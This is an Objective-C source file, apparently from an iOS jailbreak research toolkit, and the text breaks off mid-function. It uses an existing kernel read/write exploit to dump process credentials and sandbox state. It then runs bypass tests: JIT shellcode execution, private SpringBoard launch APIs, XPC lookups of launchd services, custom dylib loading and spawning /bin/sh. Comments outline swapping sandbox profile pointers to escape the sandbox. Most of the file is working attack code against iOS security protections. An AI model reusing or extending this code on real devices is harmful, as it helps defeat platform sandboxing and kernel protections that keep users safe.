//
//  kernel_research.m
//  ClaudeFiles
//
//  Kernel research toolkit for SPTM bypass investigation on iOS 18.1+ A15.
//  Uses existing kread/kwrite primitives to map kernel state and test
//  indirect bypass vectors that avoid PPL/SPTM-protected memory.
//

#import "kernel_research.h"
#import "kexploit/krw.h"
#import "kexploit/kutils.h"
#import "kexploit/offsets.h"
#import "research/sandbox_research.h"
#import <stdlib.h>
#import <string.h>
#import <stdio.h>
#import <unistd.h>
#import <spawn.h>
#import <sys/wait.h>
#import <sys/stat.h>
#import <errno.h>
#import <dlfcn.h>
#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <libkern/OSCacheControl.h>

// mach_vm.h is not available in iOS SDK.
// We resolve mach_vm_allocate/protect/deallocate via dlsym at runtime
// to avoid linker issues (symbols may not be in tbd stubs).

// sandbox_check is private API
extern int sandbox_check(pid_t pid, const char *operation, int type, ...);
#define SANDBOX_FILTER_PATH          (1 << 0)
#define SANDBOX_CHECK_NO_REPORT      (1 << 9)
#define SANDBOX_FILTER_GLOBAL_NAME   (1 << 1)
#define SANDBOX_FILTER_NONE          0

// ── Helpers ──

static char *g_buf = NULL;
static size_t g_buf_len = 0;
static size_t g_buf_cap = 0;

static void buf_init(void) {
    g_buf_cap = 8192;
    g_buf = (char *)malloc(g_buf_cap);
    g_buf[0] = '\0';
    g_buf_len = 0;
}

static void buf_append(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    char line[1024];
    vsnprintf(line, sizeof(line), fmt, ap);
    va_end(ap);

    size_t line_len = strlen(line);
    if (g_buf_len + line_len + 1 > g_buf_cap) {
        g_buf_cap = (g_buf_len + line_len + 1) * 2;
        g_buf = (char *)realloc(g_buf, g_buf_cap);
    }
    memcpy(g_buf + g_buf_len, line, line_len + 1);
    g_buf_len += line_len;
}

static char *buf_finish(void) {
    char *result = g_buf;
    g_buf = NULL;
    g_buf_len = 0;
    g_buf_cap = 0;
    return result;
}

// ── Persistent breadcrumb logger ──
// Writes to Documents/breadcrumbs.log so logs survive crashes.
// Call bc_init() at start of any research function, bc() to log.
// kresearch_read_breadcrumbs() returns the file contents.

static FILE *g_bc_file = NULL;

static void bc_init(void) {
    @autoreleasepool {
        NSString *docs = [NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        NSString *path = [docs stringByAppendingPathComponent:@"breadcrumbs.log"];
        // Truncate on each new run so we only have the latest
        g_bc_file = fopen([path UTF8String], "w");
        if (g_bc_file) {
            fprintf(g_bc_file, "[BC] breadcrumb log started\n");
            fflush(g_bc_file);
        }
    }
}

static void bc(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    char line[1024];
    vsnprintf(line, sizeof(line), fmt, ap);
    va_end(ap);

    // Write to stderr (visible if attached)
    fprintf(stderr, "%s", line);

    // Write to persistent file (survives crash)
    if (g_bc_file) {
        fprintf(g_bc_file, "%s", line);
        fflush(g_bc_file);  // flush every line — crash safe
    }
}

static void bc_close(void) {
    if (g_bc_file) {
        fprintf(g_bc_file, "[BC] breadcrumb log complete\n");
        fclose(g_bc_file);
        g_bc_file = NULL;
    }
}

// Public API: read the last breadcrumbs from disk
char *kresearch_read_breadcrumbs(void) {
    @autoreleasepool {
        NSString *docs = [NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        NSString *path = [docs stringByAppendingPathComponent:@"breadcrumbs.log"];
        NSData *data = [NSData dataWithContentsOfFile:path];
        if (!data || data.length == 0) {
            char *msg = strdup("(no breadcrumbs found — run a command first)");
            return msg;
        }
        char *result = (char *)malloc(data.length + 1);
        memcpy(result, data.bytes, data.length);
        result[data.length] = '\0';
        return result;
    }
}

static bool kaddr_ok(uint64_t addr) {
    return (addr >= VM_MIN_KERNEL_ADDRESS && addr <= VM_MAX_KERNEL_ADDRESS);
}

static void hexdump_buf(uint64_t kaddr, size_t len, const char *label) {
    buf_append("  %s @ 0x%llx (%zu bytes):\n", label, kaddr, len);
    uint8_t data[256];
    if (len > sizeof(data)) len = sizeof(data);
    kreadbuf(kaddr, data, len);
    for (size_t i = 0; i < len; i += 16) {
        buf_append("    %04zx: ", i);
        for (size_t j = 0; j < 16 && (i + j) < len; j++) {
            buf_append("%02x ", data[i + j]);
        }
        buf_append("\n");
    }
}

// Read a kernel C string (up to maxlen bytes)
static void kread_string(uint64_t kaddr, char *out, size_t maxlen) {
    if (!kaddr_ok(kaddr)) {
        snprintf(out, maxlen, "(invalid kaddr 0x%llx)", kaddr);
        return;
    }
    kreadbuf(kaddr, out, maxlen - 1);
    out[maxlen - 1] = '\0';
}

// ── Credential dumping ──

typedef struct {
    uint64_t proc;
    uint64_t proc_ro;
    uint64_t ucred;
    uint64_t task;
    uint64_t label;
    uint64_t sandbox;
    uint64_t sandbox_profile;
    uint64_t extension_set;
    uint32_t uid, ruid, svuid;
    uint32_t gid, rgid, svgid;
    uint32_t p_flag;
    uint32_t cs_flags;  // from csblob if accessible
    char p_name[32];
    pid_t pid;
} proc_info_t;

static int gather_proc_info(uint64_t proc, proc_info_t *info) {
    memset(info, 0, sizeof(*info));
    info->proc = proc;

    if (!proc || !kaddr_ok(proc)) return -1;

    info->pid = (pid_t)kread32(proc + off_proc_p_pid);
    kreadbuf(proc + off_proc_p_name, info->p_name, 31);
    info->p_flag = kread32(proc + off_proc_p_flag);

    // proc_ro
    info->proc_ro = kread_ptr(proc + off_proc_p_proc_ro);
    if (!kaddr_ok(info->proc_ro)) return -1;

    // task
    info->task = kread_ptr(info->proc_ro + off_proc_ro_pr_task);

    // ucred (PPL-protected, but we can READ)
    info->ucred = kread_ptr(info->proc_ro + off_proc_ro_p_ucred);
    if (!kaddr_ok(info->ucred)) return -1;

    // Read credential fields
    info->uid   = kread32(info->ucred + 0x18);  // cr_uid
    info->ruid  = kread32(info->ucred + 0x1c);  // cr_ruid
    info->svuid = kread32(info->ucred + 0x20);  // cr_svuid
    info->rgid  = kread32(info->ucred + 0x68);  // cr_rgid
    info->svgid = kread32(info->ucred + 0x6c);  // cr_svgid

    // Label → sandbox
    info->label = kread_ptr(info->ucred + off_ucred_cr_label);
    if (kaddr_ok(info->label)) {
        info->sandbox = kread_ptr(info->label + off_label_l_perpolicy_sandbox);
        if (kaddr_ok(info->sandbox)) {
            // sandbox_label layout (verified against sandbox_escape.m):
            //   0x00: profile/platform_profile
            //   0x08: unknown (often 0)
            //   0x10: extension_set  (OFF_SANDBOX_EXT_SET in sandbox_escape.m)
            //   0x18: unknown
            info->sandbox_profile = kread_ptr(info->sandbox + 0x00);
            info->extension_set = kread_ptr(info->sandbox + 0x10);  // was 0x08, WRONG
        }
    }

    // Try to read cs_flags from csblob chain
    uint64_t textvp = kread_ptr(proc + off_proc_p_textvp);
    if (kaddr_ok(textvp)) {
        uint64_t ubcinfo = kread_ptr(textvp + 0x78);
        if (kaddr_ok(ubcinfo)) {
            uint64_t csblob = kread_ptr(ubcinfo + 0x50);
            if (kaddr_ok(csblob)) {
                info->cs_flags = kread32(csblob + 0xC);
            }
        }
    }

    return 0;
}

static void dump_proc_info(proc_info_t *info) {
    buf_append("  PID: %d  Name: %s\n", info->pid, info->p_name);
    buf_append("  proc:     0x%llx\n", info->proc);
    buf_append("  proc_ro:  0x%llx  (PPL-protected)\n", info->proc_ro);
    buf_append("  task:     0x%llx\n", info->task);
    buf_append("  ucred:    0x%llx  (PPL-protected)\n", info->ucred);
    buf_append("  UID: %u  RUID: %u  SVUID: %u\n", info->uid, info->ruid, info->svuid);
    buf_append("  RGID: %u  SVGID: %u\n", info->rgid, info->svgid);
    buf_append("  p_flag:   0x%08x", info->p_flag);
    if (info->p_flag & 0x400) buf_append(" [P_PLATFORM]");
    buf_append("\n");
    buf_append("  cs_flags: 0x%08x", info->cs_flags);
    if (info->cs_flags & 0x1)       buf_append(" [CS_VALID]");
    if (info->cs_flags & 0x4)       buf_append(" [CS_GET_TASK_ALLOW]");
    if (info->cs_flags & 0x8)       buf_append(" [CS_INSTALLER]");
    if (info->cs_flags & 0x20000)   buf_append(" [CS_SIGNED]");
    if (info->cs_flags & 0x4000000) buf_append(" [CS_PLATFORM_BINARY]");
    buf_append("\n");
    buf_append("  label:    0x%llx\n", info->label);
    buf_append("  sandbox:  0x%llx\n", info->sandbox);
    buf_append("  profile:  0x%llx  (sandbox profile ptr — in WRITABLE memory)\n", info->sandbox_profile);
    buf_append("  ext_set:  0x%llx  (extension set — in WRITABLE memory)\n", info->extension_set);
}

// ── Public API ──

char *kresearch_dump_self(void) {
    buf_init();
    buf_append("=== SELF PROCESS STATE ===\n");

    uint64_t self_proc = proc_self();
    proc_info_t info;
    if (gather_proc_info(self_proc, &info) != 0) {
        buf_append("ERROR: Failed to gather proc info\n");
        return buf_finish();
    }
    dump_proc_info(&info);

    // Dump raw sandbox_label
    if (kaddr_ok(info.sandbox)) {
        hexdump_buf(info.sandbox, 0x40, "sandbox_label raw");
    }

    // Dump extension_set buckets
    if (kaddr_ok(info.extension_set)) {
        buf_append("\n  Extension set buckets:\n");
        for (int i = 0; i < 9; i++) {
            uint64_t bucket = kread_ptr(info.extension_set + (i * 8));
            if (bucket && kaddr_ok(bucket)) {
                // Read class node fields using raw kread (avoids pointer cast issues)
                uint64_t class_name_ptr = kread_ptr(bucket + 0x00);
                uint64_t node_count     = kread64(bucket + 0x18);
                char name[128] = {0};
                if (kaddr_ok(class_name_ptr)) {
                    kreadbuf(class_name_ptr, name, sizeof(name) - 1);
                }
                buf_append("    [%d] 0x%llx -> class: \"%s\" (count: %llu)\n",
                           i, bucket, name, (unsigned long long)node_count);
            }
        }
    }

    return buf_finish();
}

char *kresearch_dump_proc(int pid) {
    buf_init();
    buf_append("=== PROCESS %d STATE ===\n", pid);

    uint64_t target = proc_find((pid_t)pid);
    if (!target || !kaddr_ok(target)) {
        buf_append("ERROR: Could not find proc for PID %d\n", pid);
        return buf_finish();
    }

    proc_info_t info;
    if (gather_proc_info(target, &info) != 0) {
        buf_append("ERROR: Failed to gather proc info for PID %d\n", pid);
        return buf_finish();
    }
    dump_proc_info(&info);

    return buf_finish();
}

char *kresearch_compare_creds(int target_pid) {
    buf_init();
    buf_append("=== CREDENTIAL COMPARISON: self vs PID %d ===\n\n", target_pid);

    // Gather self
    proc_info_t self_info;
    if (gather_proc_info(proc_self(), &self_info) != 0) {
        buf_append("ERROR: Failed to gather self proc info\n");
        return buf_finish();
    }

    // Gather target
    uint64_t target_proc = proc_find((pid_t)target_pid);
    if (!target_proc || !kaddr_ok(target_proc)) {
        buf_append("ERROR: Could not find PID %d\n", target_pid);
        return buf_finish();
    }
    proc_info_t target_info;
    if (gather_proc_info(target_proc, &target_info) != 0) {
        buf_append("ERROR: Failed to gather target proc info\n");
        return buf_finish();
    }

    buf_append("--- SELF (PID %d, %s) ---\n", self_info.pid, self_info.p_name);
    dump_proc_info(&self_info);
    buf_append("\n--- TARGET (PID %d, %s) ---\n", target_info.pid, target_info.p_name);
    dump_proc_info(&target_info);

    buf_append("\n--- KEY DIFFERENCES ---\n");

    if (self_info.uid != target_info.uid)
        buf_append("  UID: self=%u target=%u  ← PPL-protected, cannot change\n",
                   self_info.uid, target_info.uid);

    if (self_info.p_flag != target_info.p_flag)
        buf_append("  p_flag: self=0x%x target=0x%x  ← WRITABLE (in proc, not proc_ro)\n",
                   self_info.p_flag, target_info.p_flag);

    if (self_info.cs_flags != target_info.cs_flags)
        buf_append("  cs_flags: self=0x%x target=0x%x  ← in csblob, may be PPL-protected\n",
                   self_info.cs_flags, target_info.cs_flags);

    if (self_info.sandbox_profile != target_info.sandbox_profile)
        buf_append("  sandbox_profile: self=0x%llx target=0x%llx  ← WRITABLE (in sandbox_label)\n",
                   self_info.sandbox_profile, target_info.sandbox_profile);

    if (self_info.extension_set != target_info.extension_set)
        buf_append("  extension_set: self=0x%llx target=0x%llx  ← WRITABLE\n",
                   self_info.extension_set, target_info.extension_set);

    // Check if sandbox objects are the same pointer (some daemons share)
    if (self_info.sandbox == 0 && target_info.sandbox == 0)
        buf_append("  NOTE: Both have NULL sandbox — no sandbox applied\n");
    else if (target_info.sandbox == 0)
        buf_append("  NOTE: Target has NO sandbox! We do.\n");

    return buf_finish();
}

char *kresearch_check_sandbox_ops(void) {
    buf_init();
    buf_append("=== SANDBOX OPERATION CHECK ===\n");
    pid_t pid = getpid();
    buf_append("PID: %d\n\n", pid);

    struct {
        const char *op;
        int filter;
        const char *arg;
        const char *category;
    } checks[] = {
        // Filesystem (should be allowed after sandbox escape)
        {"file-read-data",    SANDBOX_FILTER_PATH, "/",           "filesystem"},
        {"file-write-data",   SANDBOX_FILTER_PATH, "/",           "filesystem"},
        {"file-read-data",    SANDBOX_FILTER_PATH, "/private/var", "filesystem"},
        {"file-write-data",   SANDBOX_FILTER_PATH, "/private/var", "filesystem"},
        {"file-read-data",    SANDBOX_FILTER_PATH, "/bin/sh",     "filesystem"},

        // Process operations (likely blocked — key for posix_spawn)
        {"process-exec",      SANDBOX_FILTER_PATH, "/bin/sh",     "process"},
        {"process-exec",      SANDBOX_FILTER_PATH, "/usr/bin/env", "process"},
        {"process-exec*",     SANDBOX_FILTER_PATH, "/bin/sh",     "process"},
        {"process-fork",      SANDBOX_FILTER_NONE, NULL,          "process"},

        // Mach/IPC
        {"mach-lookup",       SANDBOX_FILTER_NONE, NULL,          "mach"},

        // Signal
        {"signal",            SANDBOX_FILTER_NONE, NULL,          "signal"},

        // Sysctl
        {"sysctl-read",       SANDBOX_FILTER_NONE, NULL,          "sysctl"},
        {"sysctl-write",      SANDBOX_FILTER_NONE, NULL,          "sysctl"},
    };

    int n = sizeof(checks) / sizeof(checks[0]);
    for (int i = 0; i < n; i++) {
        int result;
        if (checks[i].arg) {
            result = sandbox_check(pid, checks[i].op,
                                   checks[i].filter | SANDBOX_CHECK_NO_REPORT,
                                   checks[i].arg);
        } else {
            result = sandbox_check(pid, checks[i].op,
                                   SANDBOX_CHECK_NO_REPORT);
        }

        const char *status = (result == 0) ? "ALLOWED" : "BLOCKED";
        if (checks[i].arg) {
            buf_append("  [%s] %-7s  %s %s\n", status,
                       checks[i].category, checks[i].op, checks[i].arg);
        } else {
            buf_append("  [%s] %-7s  %s\n", status,
                       checks[i].category, checks[i].op);
        }
    }

    buf_append("\nNOTE: 'process-exec' and 'process-fork' are the key checks for posix_spawn.\n");
    buf_append("If blocked, we need to either:\n");
    buf_append("  1. Swap sandbox profile pointer (writable in sandbox_label)\n");
    buf_append("  2. Add process-exec extensions (like we do for file-read-write)\n");
    buf_append("  3. Clear/modify sandbox_label.platform_profile\n");

    return buf_finish();
}

char *kresearch_dump_sandbox_profile(void) {
    buf_init();
    buf_append("=== SANDBOX PROFILE ANALYSIS ===\n\n");

    // Our sandbox
    proc_info_t self_info;
    gather_proc_info(proc_self(), &self_info);

    buf_append("--- OUR SANDBOX ---\n");
    if (!kaddr_ok(self_info.sandbox)) {
        buf_append("  No sandbox object found!\n");
        return buf_finish();
    }

    hexdump_buf(self_info.sandbox, 0x80, "sandbox_label full dump");

    buf_append("\n  Profile pointer: 0x%llx\n", self_info.sandbox_profile);
    if (kaddr_ok(self_info.sandbox_profile)) {
        hexdump_buf(self_info.sandbox_profile, 0x40, "profile object (first 64 bytes)");

        // Try to read profile name/type if it has one
        // Sandbox profiles typically have a name string pointer near the start
        uint64_t maybe_name = kread_ptr(self_info.sandbox_profile);
        if (kaddr_ok(maybe_name)) {
            char name[128] = {0};
            kreadbuf(maybe_name, name, sizeof(name) - 1);
            // Check if it looks like ASCII
            bool is_ascii = true;
            for (int i = 0; i < 64 && name[i]; i++) {
                if (name[i] < 0x20 || name[i] > 0x7e) { is_ascii = false; break; }
            }
            if (is_ascii && name[0])
                buf_append("  Profile name (maybe): \"%s\"\n", name);
        }
    }

    // Compare with launchd (PID 1)
    uint64_t launchd_proc = proc_find(1);
    if (kaddr_ok(launchd_proc)) {
        proc_info_t launchd_info;
        gather_proc_info(launchd_proc, &launchd_info);

        buf_append("\n--- LAUNCHD (PID 1) SANDBOX ---\n");
        if (kaddr_ok(launchd_info.sandbox)) {
            hexdump_buf(launchd_info.sandbox, 0x80, "launchd sandbox_label");
            buf_append("  Profile pointer: 0x%llx\n", launchd_info.sandbox_profile);
        } else {
            buf_append("  launchd sandbox ptr: 0x%llx (NULL/invalid → NO sandbox!)\n",
                       launchd_info.sandbox);
        }

        if (self_info.sandbox_profile == launchd_info.sandbox_profile) {
            buf_append("\n  SAME profile pointer — profiles already match\n");
        } else {
            buf_append("\n  DIFFERENT profile pointers:\n");
            buf_append("    self:    0x%llx\n", self_info.sandbox_profile);
            buf_append("    launchd: 0x%llx\n", launchd_info.sandbox_profile);
            buf_append("    → Swapping could unlock process-exec\n");
        }
    }

    // Also check a few system daemons
    const char *daemons[] = {"SpringBoard", "backboardd", "logd", NULL};
    for (int i = 0; daemons[i]; i++) {
        uint64_t dp = proc_find_by_name(daemons[i]);
        if (dp && kaddr_ok(dp)) {
            proc_info_t di;
            gather_proc_info(dp, &di);
            buf_append("\n  %s (PID %d): sandbox=0x%llx profile=0x%llx uid=%u\n",
                       daemons[i], di.pid, di.sandbox, di.sandbox_profile, di.uid);
        }
    }

    return buf_finish();
}

char *kresearch_swap_sandbox_profile(void) {
    bc_init();
    bc("[SWAP] v11 starting\n");
    buf_init();
    buf_append("=== EXEC BYPASS v11 - JIT + PRIVATE API EXPLOIT ===\n");
    buf_append("v10 confirmed: RWX memory ALLOWED, private frameworks load,\n");
    buf_append("  SBSLaunchApp/xpc_pipe_routine symbols found.\n");
    buf_append("  System dylibs in shared cache (can't copy), task_for_pid denied.\n");
    buf_append("v11: Execute JIT code, call private APIs, XPC to launchd.\n\n");

    // ══════════════════════════════════════════════════════════════
    // TEST A: JIT code execution via inline assembly
    // v10 showed vm_protect RWX returns kr=0, but SPTM likely
    // enforces W^X at hardware level — page stays writable so
    // instruction fetch faults (EXC_BAD_ACCESS crash).
    // Fix: proper W^X flow — write as RW, flip to RX, then exec.
    // ══════════════════════════════════════════════════════════════
    bc("[SWAP] Test A: JIT execution (W^X safe)\n");
    buf_append("-- Test A: JIT code execution (W^X safe) --\n");
    {
        vm_address_t addr = 0;
        vm_size_t size = 0x4000;

        kern_return_t kr = vm_allocate(mach_task_self(),
            &addr, size, VM_FLAGS_ANYWHERE);
        buf_append("  vm_allocate: kr=%d addr=0x%lx\n",
                   kr, (unsigned long)addr);

        if (kr == KERN_SUCCESS) {
            // Step 1: Set page to RW (writable, not executable)
            kr = vm_protect(mach_task_self(), addr, size,
                FALSE, VM_PROT_READ | VM_PROT_WRITE);
            buf_append("  vm_protect RW: kr=%d\n", kr);

            if (kr == KERN_SUCCESS) {
                // Step 2: Write ARM64 shellcode: mov x0, #42; ret
                uint32_t code[] = {
                    0xd2800540, // mov x0, #42
                    0xd65f03c0  // ret
                };
                memcpy((void *)(uintptr_t)addr, code, sizeof(code));
                buf_append("  Wrote shellcode at 0x%lx\n",
                           (unsigned long)addr);

                // Verify write
                uint32_t readback = *(uint32_t *)(uintptr_t)addr;
                buf_append("  Readback: 0x%08x (expect 0xd2800540)\n", readback);

                // Step 3: Flush icache BEFORE flipping to RX
                sys_icache_invalidate((void *)(uintptr_t)addr, sizeof(code));
                buf_append("  icache flushed\n");

                // Step 4: Flip page to RX (executable, no longer writable)
                // This is the W^X-safe path — SPTM should allow this
                kern_return_t kr2 = vm_protect(mach_task_self(), addr, size,
                    FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
                buf_append("  vm_protect RX: kr=%d\n", kr2);

                if (kr2 == KERN_SUCCESS) {
                    // Step 5: Execute JIT code
                    uint64_t result = 0;
                    bc("[SWAP] Calling JIT code (W^X safe)...\n");
#if __arm64e__
                    // Use plain BLR (not BLRAAZ) to skip PAC on call target.
                    // The JIT code's RET uses the lr set by BLR — no PAC involved.
                    __asm__ volatile(
                        "mov x9, %1\n"   // load JIT addr into x9
                        "blr x9\n"       // branch-link-register (no PAC check)
                        "mov %0, x0\n"   // capture return value
                        : "=r"(result)
                        : "r"((uint64_t)addr)
                        : "x0", "x1", "x2", "x3", "x4", "x5",
                          "x6", "x7", "x8", "x9", "x30", "memory"
                    );
#else
                    // Non-arm64e: normal function pointer call
                    typedef uint64_t (*jit_fn)(void);
                    result = ((jit_fn)(uintptr_t)addr)();
#endif
                    bc("[SWAP] JIT returned: %llu\n",
                            (unsigned long long)result);
                    buf_append("  JIT returned: %llu (expected 42)\n",
                               (unsigned long long)result);
                    if (result == 42) {
                        buf_append("  *** JIT CODE EXECUTION WORKS! ***\n");
                        buf_append("  >>> W^X safe JIT: write RW, flip RX, execute <<<\n");
                    } else {
                        buf_append("  JIT ran but returned wrong value\n");
                    }
                } else {
                    buf_append("  *** vm_protect RX DENIED (kr=%d) ***\n", kr2);
                    buf_append("  SPTM blocks RW->RX transition too!\n");

                    // Fallback: try RWX (maybe SPTM is lenient?)
                    kern_return_t kr3 = vm_protect(mach_task_self(), addr, size,
                        FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
                    buf_append("  Fallback vm_protect RWX: kr=%d\n", kr3);
                    buf_append("  (NOT executing — would crash if W^X enforced)\n");
                }
            }

            vm_deallocate(mach_task_self(), addr, size);
        }
    }

    // ══════════════════════════════════════════════════════════════
    // TEST B: Call SBSLaunchApplicationWithIdentifier
    // This private API tells SpringBoard to launch an app.
    // Different code path than posix_spawn — goes via XPC to SB.
    // ══════════════════════════════════════════════════════════════
    bc("[SWAP] Test B: SBS launch app\n");
    buf_append("\n-- Test B: Launch app via SpringBoardServices --\n");
    {
        void *sbs = dlopen("/System/Library/PrivateFrameworks/"
            "SpringBoardServices.framework/SpringBoardServices", RTLD_LAZY);
        if (!sbs) {
            buf_append("  dlopen SBS: FAILED\n");
        } else {
            // Try the simpler API first
            void *sym = dlsym(sbs, "SBSLaunchApplicationWithIdentifier");
            buf_append("  SBSLaunchApplicationWithIdentifier: %p\n", sym);

            if (sym) {
                // SBSLaunchApplicationWithIdentifier(CFStringRef bundleID,
                //                                    BOOL suspended)
                // Returns int (0 = success)
                typedef int (*sbs_launch_fn)(CFStringRef, BOOL);
                sbs_launch_fn launch = (sbs_launch_fn)sym;

                // Try launching Safari
                CFStringRef safari = CFSTR("com.apple.mobilesafari");
                int ret = launch(safari, NO);
                buf_append("  Launch Safari: ret=%d (%s)\n",
                           ret, ret == 0 ? "SUCCESS" : "FAILED");

                // Try launching Settings
                CFStringRef settings = CFSTR("com.apple.Preferences");
                ret = launch(settings, NO);
                buf_append("  Launch Settings: ret=%d (%s)\n",
                           ret, ret == 0 ? "SUCCESS" : "FAILED");
            }

            // Also try the options variant
            void *sym2 = dlsym(sbs,
                "SBSLaunchApplicationWithIdentifierAndLaunchOptions");
            buf_append("  WithLaunchOptions: %p\n", sym2);
            if (sym2) {
                // SBSLaunchApplicationWithIdentifierAndLaunchOptions(
                //     CFStringRef bundleID, CFDictionaryRef options,
                //     BOOL suspended)
                typedef int (*sbs_launch2_fn)(CFStringRef,
                    CFDictionaryRef, BOOL);
                sbs_launch2_fn launch2 = (sbs_launch2_fn)sym2;

                CFStringRef safari = CFSTR("com.apple.mobilesafari");
                int ret = launch2(safari, NULL, NO);
                buf_append("  Launch Safari (opts): ret=%d\n", ret);
            }

            // Try SBSOpenSensitiveURLConnectionWithIdentifier
            // This can open URLs, potentially url schemes
            void *sym3 = dlsym(sbs, "SBSOpenSensitiveURLConnectionWithIdentifier");
            buf_append("  SBSOpenSensitiveURL: %s\n",
                       sym3 ? "FOUND" : "not found");
        }
    }

    // ══════════════════════════════════════════════════════════════
    // TEST C: XPC communication with launchd
    // Try submitting a launchd job via XPC. If we can talk to
    // launchd, we can potentially run code as root.
    // ══════════════════════════════════════════════════════════════
    bc("[SWAP] Test C: XPC to launchd\n");
    buf_append("\n-- Test C: XPC to launchd --\n");
    {
        // Use Objective-C xpc wrappers
        void *xpc_h = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
        if (!xpc_h) {
            buf_append("  dlopen libxpc: FAILED\n");
        } else {
            // Check what XPC services we can connect to
            // xpc_connection_create_mach_service connects to launchd-managed
            // services
            typedef void* (*xpc_conn_create_fn)(const char *, void *, uint64_t);
            xpc_conn_create_fn xpc_conn_create = (xpc_conn_create_fn)
                dlsym(xpc_h, "xpc_connection_create_mach_service");
            buf_append("  xpc_connection_create_mach_service: %p\n",
                       (void *)xpc_conn_create);

            // Try connecting to interesting services
            const char *services[] = {
                "com.apple.springboard.services",
                "com.apple.mobile.installd",
                "com.apple.lsd.mapdb",
                "com.apple.runningboard",
                "com.apple.coreservices.launchservicesd",
                NULL
            };

            if (xpc_conn_create) {
                for (int i = 0; services[i]; i++) {
                    void *conn = xpc_conn_create(services[i], NULL, 0);
                    buf_append("  %s: %s\n",
                               services[i], conn ? "CONNECTED" : "FAILED");
                }
            }

            // Try bootstrap_look_up for mach ports
            typedef kern_return_t (*bootstrap_lookup_fn)(mach_port_t,
                const char *, mach_port_t *);
            bootstrap_lookup_fn blookup = (bootstrap_lookup_fn)
                dlsym(xpc_h, "bootstrap_look_up");
            if (!blookup) {
                // It's in libSystem
                void *ls = dlopen("/usr/lib/libSystem.B.dylib", RTLD_LAZY);
                if (ls) blookup = (bootstrap_lookup_fn)
                    dlsym(ls, "bootstrap_look_up");
            }
            buf_append("\n  bootstrap_look_up: %p\n", (void *)blookup);

            if (blookup) {
                mach_port_t bp = MACH_PORT_NULL;
                task_get_special_port(mach_task_self(),
                    TASK_BOOTSTRAP_PORT, &bp);
                buf_append("  bootstrap port: 0x%x\n", bp);

                if (bp != MACH_PORT_NULL) {
                    const char *mach_services[] = {
                        "com.apple.springboard.services",
                        "com.apple.runningboard",
                        "com.apple.mobile.installd",
                        NULL
                    };
                    for (int i = 0; mach_services[i]; i++) {
                        mach_port_t port = MACH_PORT_NULL;
                        kern_return_t kr = blookup(bp,
                            mach_services[i], &port);
                        buf_append("  %s: kr=%d port=0x%x\n",
                                   mach_services[i], kr, port);
                    }
                }
            }
        }
    }

    // ══════════════════════════════════════════════════════════════
    // TEST D: Write minimal Mach-O dylib and try dlopen
    // Even though system dylibs are in shared cache, we can try
    // writing our OWN Mach-O and loading it. Code signing will
    // likely block this, but we need to know the exact error.
    // ══════════════════════════════════════════════════════════════
    bc("[SWAP] Test D: custom dylib\n");
    buf_append("\n-- Test D: Write and load custom Mach-O --\n");
    {
        NSArray *docPaths = NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *docs = [docPaths firstObject];

        if (docs) {
            NSString *testPath = [docs stringByAppendingPathComponent:
                @"test_jit.dylib"];

            // Minimal ARM64 Mach-O dylib (just headers, no real code)
            // MH_MAGIC_64 + minimal load commands
            uint8_t macho[] = {
                // Mach-O header (32 bytes)
                0xCF, 0xFA, 0xED, 0xFE, // MH_MAGIC_64
                0x0C, 0x00, 0x00, 0x01, // CPU_TYPE_ARM64
                0x00, 0x00, 0x00, 0x00, // CPU_SUBTYPE
                0x06, 0x00, 0x00, 0x00, // MH_DYLIB
                0x00, 0x00, 0x00, 0x00, // ncmds=0
                0x00, 0x00, 0x00, 0x00, // sizeofcmds=0
                0x85, 0x00, 0x20, 0x00, // flags: MH_DYLDLINK|MH_PIE|etc
                0x00, 0x00, 0x00, 0x00, // reserved
            };

            NSData *data = [NSData dataWithBytes:macho length:sizeof(macho)];
            BOOL wrote = [data writeToFile:testPath atomically:YES];
            buf_append("  Write test dylib: %s\n",
                       wrote ? "OK" : "FAILED");

            if (wrote) {
                void *h = dlopen([testPath UTF8String], RTLD_LAZY);
                buf_append("  dlopen custom dylib: %s\n",
                           h ? "*** LOADED! ***" : dlerror());
                if (h) {
                    buf_append("  >>> CUSTOM CODE LOADING WORKS! <<<\n");
                    dlclose(h);
                }
            }

            [[NSFileManager defaultManager]
                removeItemAtPath:testPath error:nil];
        }
    }

    // ══════════════════════════════════════════════════════════════
    // TEST E: posix_spawn with different attrs/flags
    // Previous tests used default attrs. Try with specific flags
    // that might bypass the sandbox/AMFI check.
    // ══════════════════════════════════════════════════════════════
    bc("[SWAP] Test E: posix_spawn variants\n");
    buf_append("\n-- Test E: posix_spawn with different attrs --\n");
    {
        // Test 1: posix_spawn with POSIX_SPAWN_SETEXEC (replace process)
        posix_spawnattr_t attr;
        posix_spawnattr_init(&attr);
        short flags = POSIX_SPAWN_SETPGROUP;
        posix_spawnattr_setflags(&attr, flags);

        pid_t child = 0;
        char *argv[] = {"/bin/sh", "-c", "echo jb_ok", NULL};
        char *envp[] = {NULL};
        int ret = posix_spawn(&child, "/bin/sh", NULL, &attr, argv, envp);
        buf_append("  posix_spawn /bin/sh (SETPGROUP): %d (%s)\n",
                   ret, ret == 0 ? "SUCCESS" : strerror(ret));
        posix_spawnattr_destroy(&attr);

        // Test 2: Try /usr/bin/env instead
        child = 0;
        char *argv2[] = {"/usr/bin/env", "sh", "-c", "echo jb_ok", NULL};
        ret = posix_spawn(&child, "/usr/bin/env", NULL, NULL, argv2, envp);
        buf_append("  posix_spawn /usr/bin/env: %d (%s)\n",
                   ret, ret == 0 ? "SUCCESS" : strerror(ret));

        // Test 3: Try spawning ourselves (re-exec)
        NSString *selfPath = [[NSBundle mainBundle] executablePath];
        buf_append("  Our executable: %s\n", [selfPath UTF8String]);
        child = 0;
        char *argv3[] = {(char *)[selfPath UTF8String], NULL};
        ret = posix_spawn(&child, [selfPath UTF8String],
                         NULL, NULL, argv3, envp);
        buf_append("  posix_spawn self: %d (%s)\n",
                   ret, ret == 0 ? "SUCCESS" : strerror(ret));

        if (ret == 0 && child > 0) {
            buf_append("  *** SELF-EXEC WORKS! child=%d ***\n", child);
